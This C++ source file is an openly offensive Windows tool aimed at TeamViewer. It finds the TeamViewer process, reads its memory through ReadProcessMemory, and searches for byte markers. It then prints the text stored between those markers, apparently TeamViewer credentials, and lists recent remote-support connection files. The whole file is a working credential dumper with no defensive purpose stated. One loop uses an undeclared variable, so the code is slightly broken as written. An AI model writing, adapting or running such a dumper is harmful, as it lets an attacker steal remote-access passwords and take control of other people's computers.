/**
 +    @author Vahagn Vardanyan (@vah_13)
 +    @version 1.1 31/07/17 
 +	  Kudos to @jarod42
 +
**/

#include <set>
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <list>     
#include <iterator>
#include <algorithm>
#include <iomanip>
#include <stdio.h>
#include <ctype.h>

using namespace std;

int GetProcId(char* ProcName)
{
	PROCESSENTRY32   pe32;
	HANDLE         hSnapshot = NULL;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( Process32First( hSnapshot, &pe32 ) )
	{
		do{
			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
				break;
		}while( Process32Next( hSnapshot, &pe32 ) );
	}
	if( hSnapshot != INVALID_HANDLE_VALUE )
		CloseHandle( hSnapshot );
	return pe32.th32ProcessID;
	
}

string intToHexString(int intValue) {
    string hexStr;
    std::stringstream sstream;
    sstream << "0x"
            << std::setfill ('0') << std::setw(2)
    << std::hex << (int)intValue;

    hexStr= sstream.str();
    sstream.clear();   

    return hexStr;
}
bool PromptForChar( const char* prompt, char& readch )
{
    std::string tmp;
    std::cout << prompt << std::endl;
    if (std::getline(std::cin, tmp))
    {
        if (tmp.length() == 1)
        {
            readch = tmp[0];
        }
        else
        {
            readch = '\0';
        }
        return true;
    }
    return false;
}

bool readMemory(DWORD pid, char* _p, size_t len)
{
	HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = _p;
		VirtualQueryEx(process, p, &info, sizeof(info));
		chunk.resize(len);
		SIZE_T bytesRead;
		ReadProcessMemory(process, p, &chunk[0], len, &bytesRead);
		
		if (bytesRead<6*2)
		{
			return false;
		}
		for (int i = 0;i<bytesRead;i+=2)
		{
			if (!isprint(chunk[i]) || ((int)chunk[i])<=0)
			{
					return false;
			}
		}
		
		
		if (bytesRead>1)
		{
			for (i = 0;i<bytesRead;i+=2)
			{
					cout<< /*"char = "<< */chunk[i] ;/*<< " int = " << (int)chunk[i];*/	
			}
			cout <<endl;
		}
		
    }
	return true;
}

void binsearch(DWORD pid, const std::list<int>& first, const std::list<int>& second, const int limit)  
{
	cout << "binsearch start \n";
    std::list<int>::const_iterator it1 = first.begin();
    std::list<int>::const_iterator  it2 = second.begin();

	
    while (it1 != first.end() && it2 != second.end()) {
        if (*it1 + limit < *it2) {
            ++it1;
        } else if (*it2 + limit < *it1) {
            ++it2;
        } else {
				
           	{
				            try{
								if (*it2-*it1>0)
									readMemory(pid,(char*)(void*)(*it1+2),*it2-*it1-2);//);
							}catch (int a){
							cout<< "cc"<<endl;
							}
			}	
            ++it1;
        }
    }
		cout << "binsearch end \n";
}

void GetAddressOfData(DWORD pid, const char *data, size_t len, list<int>& entries)
{
	//list<int>* entries;
	int count = 0;
    HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = 0;
        while(p < si.lpMaximumApplicationAddress)
        {
            if(VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info))
            {
			  if (info.Type == MEM_PRIVATE && info.State == MEM_COMMIT)
			  {     
				    p = (char*)info.BaseAddress;
					chunk.resize(info.RegionSize);
					SIZE_T bytesRead;

					if(ReadProcessMemory(process, p, &chunk[0], info.RegionSize, &bytesRead))
					{

					   for(size_t i = 0; i < (bytesRead - len); ++i)
						{							
								if(memcmp(data, &chunk[i], len) == 0)
								{
									entries.push_back((int)(void*)(p+i));
									count ++;
								}
						}
					}
				}
                p += info.RegionSize;
            }

        }
    }
	
	cout << "return list of address " << intToHexString(count) << endl;
		
	return ;
}

void __main(bool flag)
{
		const char start_magic_data[] = "\x00\x88"; 
  		char _end_magic_data1[] = "\x00\x00\x00\x20\x00\x00";
		char _end_magic_data2[] = "\x00\x00\x00\x00\x00\x00";
		if (flag)
		{
			*_end_magic_data1 = *_end_magic_data1;
		}
		else
		{
			memcpy(_end_magic_data1, _end_magic_data2, sizeof(_end_magic_data2));
		}

		for (int mg=0;mg<6;mg++)
		{
			cout<< (int)_end_magic_data1[mg];
		}
		cout << endl;
		int PID = GetProcId("TeamViewer.exe");	
		std::cout << "Local data address: " << (void*)start_magic_data << "\n";
		cout<<"start end magic search "<<'\n';	
		
		
		list<int> start_address ; 
			GetAddressOfData(PID, start_magic_data, 2, start_address);	
		cout << "start mg address length "<< intToHexString(std::distance(start_address.begin(),start_address.end())) << endl;


		list<int> end_address  ; 
			GetAddressOfData(PID, _end_magic_data1, (sizeof(_end_magic_data1)/sizeof(*_end_magic_data1))-1,end_address );
		cout << "end mg address length " << intToHexString(std::distance(end_address.begin(),end_address.end())) << endl;
		
		int key = 0;
		int count = 0;
	
		cout << "_main binsearch\n";

		binsearch(PID, start_address,end_address,33);
		cout<< "_main binsearch "<< endl;
		
}
void getTVaddress()
{
	char* appdata = getenv("APPDATA") ;
	char* tvaddr  = "\\TeamViewer\\MRU\\RemoteSupport\\*.tvc";
	char* path = new char[strlen(appdata)+strlen(tvaddr)+1];

	sprintf(path, "%s%s", appdata, tvaddr);

	cout << "Get TV address\n";

	HANDLE hFind;
	WIN32_FIND_DATA data;

	hFind = FindFirstFile(path, &data);
	if (hFind != INVALID_HANDLE_VALUE) {
	  do {
		printf("%s\n", data.cFileName);
	  } while (FindNextFile(hFind, &data));
	  FindClose(hFind);
	}

}
int main()
{
	getTVaddress();
	
	__main(true);

	char type = '\0';
	while( PromptForChar( "Try 00x00x00x00x00x00x00 magic data (may have more false positive) ? [y/n]", type ) )
		{
			if (type == 'y')
			{
					__main(false);			
			}
			if (type== 'n')
			{
					cout << ":-)";
					return 0;
			}
		}
    return 0;	


}
